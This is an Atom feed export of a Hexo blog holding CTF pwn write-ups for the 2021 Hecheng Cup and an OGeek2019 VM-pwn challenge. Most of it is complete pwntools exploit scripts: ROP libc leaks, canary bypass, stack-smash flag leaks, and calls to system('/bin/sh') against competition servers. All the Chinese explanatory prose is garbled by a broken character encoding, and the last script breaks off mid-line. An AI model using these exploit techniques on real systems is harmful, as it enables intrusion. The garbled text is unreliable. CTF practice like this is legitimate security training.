<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ShouCheng</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-10-13T08:01:25.322Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>ShouCheng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021é¹¤åŸæ¯PWN</title>
    <link href="http://example.com/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/</id>
    <published>2021-10-08T12:29:14.000Z</published>
    <updated>2021-10-13T08:01:25.322Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡é¹¤åŸæ¯çš„é¢˜ç›®å‹å–„ï¼Œé€‚åˆæˆ‘è¿™ç§pwnğŸ‘¶ç©è€ï¼Œä½†æ˜¯å°±æ˜¯è¿™ç§å¹¼å„¿å›­éš¾åº¦ï¼Œå´æ²¡èƒ½akï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œç»§ç»­å­¦ä¹ å§ï¼è¿Ÿæ—©ğŸ‘¶è¦å˜æˆğŸ‘´ï¼</p><h2 id="babyof"><a href="#babyof" class="headerlink" title="babyof"></a>babyof</h2><p>æ™®é€šæ ˆæº¢å‡ºï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œéå¸¸åŸºç¡€çš„é¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">21613</span>)<br><span class="hljs-comment">#p = process(&#x27;./littleof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./babyof&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>main = <span class="hljs-number">0x40066b</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400743</span><br>ret = <span class="hljs-number">0x0000000000400506</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,payload)<br>p.recvline()<br>puts = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)<br>p.send(payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="littleof"><a href="#littleof" class="headerlink" title="littleof"></a>littleof</h2><p>è¿™é¢˜æ¯”ä¸Šé¢å¤šäº†ä¸ªcanaryçš„æ³„éœ²ï¼Œå…¶ä»–æ²¡ä»€ä¹ˆå·®åˆ«ï¼ŒåŒæ ·æ˜¯åŸºç¡€æ ˆæº¢å‡ºé¢˜ç›®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">27056</span>)<br><span class="hljs-comment">#p = process(&#x27;./littleof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./littleof&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>main = <span class="hljs-number">0x00000000004006E2</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400863</span><br>ret = <span class="hljs-number">0x000000000040059e</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> <br>p.sendlineafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>)<br>canary = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0xa</span><br>log.info(<span class="hljs-built_in">hex</span>(canary))<br>p.recvuntil(<span class="hljs-string">&quot;Try harder!&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.send(payload)<br>p.recvline()<br>puts = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Try harder!&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="easycho"><a href="#easycho" class="headerlink" title="easycho"></a>easycho</h2><p>è¿™é¢˜æ˜¯stack smashï¼Œç¨‹åºæŠŠflagè¯»åˆ°äº†.bssä¸Šï¼Œåˆæœ‰åœ°æ–¹å¯ä»¥å†™æ³„éœ²pieåœ°å€ï¼Œè·å¾—pieåœ°å€ï¼Œä¹Ÿå°±è·å¾—äº†flagåœ°å€ï¼Œä¹‹åé€šè¿‡æ ˆæº¢å‡ºæŠŠargv[0]æ”¹ä¸ºæŒ‡å‘flagï¼Œåœ¨å¼•å‘stack_chk_failåæ‰“å°å‡ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">24842</span>)<br><span class="hljs-comment">#p = process(&#x27;./easyecho&#x27;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0xB1D)&quot;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Name: &quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>pie = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xcf0</span><br>flag_addr = <span class="hljs-number">0x0000000000202040</span> + pie<br>log.info(<span class="hljs-built_in">hex</span>(pie))<br>p.recvuntil(<span class="hljs-string">&quot;Input: &quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;backdoor&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Input: &quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x168</span> + p64(flag_addr))<br>p.sendlineafter(<span class="hljs-string">&quot;Input: &quot;</span>,<span class="hljs-string">&#x27;exitexit&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>æ”»é˜²ä¸–ç•Œæœ‰åŸé¢˜<a href="https://blog.csdn.net/seaaseesa/article/details/103093182/%EF%BC%8C%E6%AF%9B%E9%83%BD%E6%B2%A1%E5%8F%98">https://blog.csdn.net/seaaseesa/article/details/103093182/ï¼Œæ¯›éƒ½æ²¡å˜</a></p><h2 id="onecho"><a href="#onecho" class="headerlink" title="onecho"></a>onecho</h2><p>è¿™é¢˜æ¯”èµ›æ²¡å‡ºï¼Œå¥½å¥½å†™å†™wp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™æ¬¡é¹¤åŸæ¯çš„é¢˜ç›®å‹å–„ï¼Œé€‚åˆæˆ‘è¿™ç§pwnğŸ‘¶ç©è€ï¼Œä½†æ˜¯å°±æ˜¯è¿™ç§å¹¼å„¿å›­éš¾åº¦ï¼Œå´æ²¡èƒ½akï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œç»§ç»­å­¦ä¹ å§ï¼è¿Ÿæ—©ğŸ‘¶è¦å˜æˆğŸ‘´ï¼&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>VM pwn</title>
    <link href="http://example.com/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/</id>
    <published>2021-10-04T03:28:49.000Z</published>
    <updated>2021-10-13T08:01:25.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¬¬ä¸€æ¬¡åšVM pwnï¼Œè™½ç„¶å…¨ç¨‹æ˜¯è·Ÿç€è¯¸å¤šå¤§ä½¬åšå®¢èµ°çš„ï¼Œä½†æ€»å¾—è¿˜æ˜¯ä¸ªé‡Œç¨‹ç¢‘ï¼Œåœ¨pwnçš„è·¯ä¸Šèµ°çš„æ›´è¿œäº†ä¸€äº›ã€‚pwnğŸ‘¶ä¹Ÿæƒ³å˜æˆpwnğŸ‘´ï¼Œä¸çŸ¥é“è¿™å¤©è¿˜æœ‰å¤šè¿œ~</p><p>wpæ¥æºï¼š</p><p><a href="https://blog.csdn.net/A951860555/article/details/117214601?spm=1001.2014.3001.5501">https://blog.csdn.net/A951860555/article/details/117214601?spm=1001.2014.3001.5501</a></p><p><a href="https://www.cnblogs.com/lemon629/p/13975686.html">https://www.cnblogs.com/lemon629/p/13975686.html</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/105862737">https://blog.csdn.net/seaaseesa/article/details/105862737</a></p><p><a href="https://zhuanlan.zhihu.com/p/257132453">https://zhuanlan.zhihu.com/p/257132453</a></p><h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>é¢˜ç›®æ¥è‡ªbuuoj</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211004113441697.png" alt="image-20211004113441697"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œstackæ²¡å¼€</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191907462.png" alt="image-20211005191907462"></p><p>ä¸»å‡½æ•°çš„ä»£ç å®¡è®¡</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191927756.png" alt="image-20211005191927756"></p><p>fetchå‡½æ•°çš„è¯ï¼Œå–å‡ºpcæŒ‡å‘çš„æŒ‡ä»¤ï¼Œå¹¶è‡ªåŠ¨åŠ 1ï¼ŒæŒ‡å‘ä¸‹ä¸€æ¡</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005192113608.png" alt="image-20211005192113608"></p><p>executeå‡½æ•°çš„ä»£ç å®¡è®¡ï¼Œä¸‹é¢æ˜¯æ ¹æ®ä»£ç æ•´åˆå‡ºæ¥çš„æŒ‡ä»¤è¡¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">instr  --&gt;  op | num1 | num2 | num3  4B 32bit<br>op:<br>0x10 --&gt; reg[num1] = unsigned_byte(instr)<br>0x20 --&gt; reg[num1] = (byte(instr) == 0)<br>0x30 --&gt; reg[num1] = memory[reg[num3]] --&gt; mov mem, reg<br>0x40 --&gt; memory[reg[num3]] = reg[num1] --&gt; mov reg, mem<br>0x50 --&gt; stack[sp++] = reg[num1] --&gt; push reg<br>0x60 --&gt; reg[num1] = stack[--sp] --&gt; pop reg<br>0x70 --&gt; reg[num1] = reg[num3] + reg[num2] --&gt; add<br>0x80 --&gt; reg[num1] = reg[num2] - reg[num3] --&gt; sub<br>0x90 --&gt; reg[num1] = reg[num3] &amp; reg[num2] --&gt; and<br>0xA0 --&gt; reg[num1] = reg[num3] | reg[num2] --&gt; or<br>0xB0 --&gt; reg[num1] = reg[num3] ^ reg[num2] --&gt; xor  <br>0xC0 --&gt; reg[num1] = reg[num2] &lt;&lt; reg[num3]--&gt; shl<br>0xD0 --&gt; reg[num1] = reg[num2] &gt;&gt; reg[num3]--&gt; shr<br>0XE0 and else --&gt; exit<br></code></pre></td></tr></table></figure><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005183901799-16334329637311.png" alt="image-20211005183901799"></p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191434825.png" alt="image-20211005191434825"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">çŸ¥è¯†è¡¥å……ï¼š<br>movsx æœ‰ç¬¦å·æ‰©å±•ï¼Œå¹¶ä¼ é€ã€‚é€šè¿‡ç¬¦å·è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœç¬¦å·ä½æ˜¯0ï¼Œåˆ™æ‰©å±•çš„å…¨éƒ½æ˜¯0ï¼Œå¦‚æœæ˜¯1ï¼Œåˆ™æ‰©å±•çš„å…¨éƒ½æ˜¯1ã€‚è€Œè¯¥é¢˜ä¸­çš„movsxdæ˜¯ä¸€æ ·çš„ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ˜¯ä»ecxæ‹“å±•ä¸ºrdx<br>movzx æ— ç¬¦å·æ‰©å±•ï¼Œå¹¶ä¼ é€ã€‚æ‰€ä»¥ä¸€èˆ¬é€‚ç”¨åœ¨æ— ç¬¦å·çš„å°æ•°å€¼æ‹·è´åˆ°å¤§æ•°å€¼é‡Œé¢<br>ä¸¤ä¸ªæŒ‡ä»¤æ‰©å±•çš„ä½æ•°éƒ½å’Œç›®çš„æ“ä½œå¯„å­˜å™¨çš„ä½æ•°ä¸€è‡´<br></code></pre></td></tr></table></figure><p>ç»“åˆæ±‡ç¼–ä¸€èµ·çœ‹ï¼Œå¯ä»¥å‘ç°ï¼Œæ•°ç»„ä¸‹æ ‡æ²¡æœ‰ç¦æ­¢ä¸ºè´Ÿæ•°çš„æƒ…å†µï¼Œæ‰€ä»¥æ˜¯å¯ä»¥å‘ä¸Šè®¿é—®åˆ°gotè¡¨ï¼Œä»è€ŒæŠŠå‡½æ•°åœ°å€æ”¾å…¥å¯„å­˜å™¨ä¸­ï¼Œè·å¾—å‡½æ•°åœ°å€ã€‚ä½†æ˜¯è¿™è¾¹è¦æ³¨æ„ï¼Œå¯„å­˜å™¨è·Ÿå†…å­˜æ˜¯4å­—èŠ‚çš„ï¼Œè€Œæ³„éœ²çš„åœ°å€æ˜¯6å­—èŠ‚çš„ï¼Œã€æ‰€ä»¥è¦ç”¨ä¸¤ä¸ªå¯„å­˜å™¨åˆ†åˆ«å­˜æ”¾é«˜å››å­—èŠ‚å’Œä½å››å­—èŠ‚</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005195005486.png" alt="image-20211005195005486"></p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005195011712.png" alt="image-20211005195011712"></p><p>ç„¶åå°±æ˜¯é€€å‡ºexecuteæ—¶ï¼Œä¼šå¾€ä¹‹å‰ç”³è¯·çš„å †å—é‡Œé¢å†™å…¥å†…å®¹ï¼Œå†é‡Šæ”¾æ‰ã€‚ä½†æ˜¯å› ä¸ºè¿™ä¸ªå †å—çš„åœ°å€æ˜¯å­˜æ”¾åœ¨.bssä¸Šçš„ï¼Œåœ¨ä¸Šé¢çš„æ•°ç»„è¶Šç•ŒåŒæ ·å¯ä»¥ä¿®æ”¹ï¼Œæ‰€ä»¥å¯ä»¥æ”¹ä¸ºfree_hook - 0x8ï¼Œæ”¹ä¸ºè¿™ä¸ªæ˜¯å› ä¸ºæˆ‘ä»¬è¦é‡Šæ”¾å¾—æ˜¯ä¸€å—å«æœ‰/bin/shçš„å †å—ï¼Œæ‰€ä»¥è¦å…ˆæœ‰ä½ç½®å¡«å……/bin/shï¼Œç„¶åå†å†™å…¥systemå‡½æ•°ã€‚</p><p>å£°æ˜ï¼šæˆ‘ä¸‹é¢çš„å›¾éƒ½æ˜¯å¿˜äº†-0x8çš„ï¼Œåé¢æ‡’å¾—å†æˆªå›¾äº†</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005210317826.png" alt="image-20211005210317826"></p><p>å¯ä»¥çœ‹è§ï¼Œä¸€é¡¿æ“ä½œåï¼Œå¯„å­˜å™¨ä¸Šç¡®å®å­˜æ”¾äº†ä¸€ä¸ªlibcåœ°å€ï¼Œè®¡ç®—ä¸free_hookçš„åç§»å³å¯</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005211732444.png" alt="image-20211005211732444"></p><p>ç„¶åé€šè¿‡0x10ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„åŠ ï¼Œæœ€ç»ˆæ”¹æˆfree_hook</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005212732683.png" alt="image-20211005212732683"></p><p>è·Ÿç¬¬ä¸€æ­¥ä¸€æ ·ï¼ŒæŠŠfree_hookåœ°å€å†™å…¥comment</p><p>ç„¶åå°±æ˜¯è¾“å…¥/bin/shä»¥åŠsystemå‡½æ•°ï¼Œå³å¯getshellï¼</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005213743697.png" alt="image-20211005213743697"></p><p>æˆåŠŸï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28420</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b *main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_code</span>(<span class="hljs-params">op,num1,num2,num3</span>):</span><br>    code = (op&lt;&lt;<span class="hljs-number">24</span>) + (num1&lt;&lt;<span class="hljs-number">16</span>) + (num2&lt;&lt;<span class="hljs-number">8</span>) + num3<br>    p.sendline(<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">instr  --&gt;  op | num1 | num2 | num3  4B 32bit</span><br><span class="hljs-string">op:</span><br><span class="hljs-string">0x10 --&gt; reg[num1] = unsigned_byte(instr)</span><br><span class="hljs-string">0x20 --&gt; reg[num1] = (byte(instr) == 0)</span><br><span class="hljs-string">0x30 --&gt; reg[num1] = memory[reg[num3]] --&gt; mov reg, mem</span><br><span class="hljs-string">0x40 --&gt; memory[reg[num3]] = reg[num1] --&gt; mov mem, reg</span><br><span class="hljs-string">0x50 --&gt; stack[sp++] = reg[num1] --&gt; push reg</span><br><span class="hljs-string">0x60 --&gt; reg[num1] = stack[--sp] --&gt; pop reg</span><br><span class="hljs-string">0x70 --&gt; reg[num1] = reg[num3] + reg[num2] --&gt; add</span><br><span class="hljs-string">0x80 --&gt; reg[num1] = reg[num2] - reg[num3] --&gt; sub</span><br><span class="hljs-string">0x90 --&gt; reg[num1] = reg[num3] &amp; reg[num2] --&gt; and</span><br><span class="hljs-string">0xA0 --&gt; reg[num1] = reg[num3] | reg[num2] --&gt; or</span><br><span class="hljs-string">0xB0 --&gt; reg[num1] = reg[num3] ^ reg[num2] --&gt; xor  </span><br><span class="hljs-string">0xC0 --&gt; reg[num1] = reg[num2] &lt;&lt; reg[num3]--&gt; shl</span><br><span class="hljs-string">0xD0 --&gt; reg[num1] = reg[num2] &gt;&gt; reg[num3]--&gt; shr</span><br><span class="hljs-string">0xE0 and else --&gt; exit</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;PCPC: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;SP: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;CODE SIZE: &quot;</span>,<span class="hljs-string">&#x27;18&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;CODE: &quot;</span>)<br><span class="hljs-comment">#å†™å…¥libc</span><br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">25</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x30</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>input_code(<span class="hljs-number">0x30</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#ä¿®æ”¹libc</span><br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>input_code(<span class="hljs-number">0xC0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xa0</span>)<br>input_code(<span class="hljs-number">0x70</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br>input_code(<span class="hljs-number">0x70</span>,<span 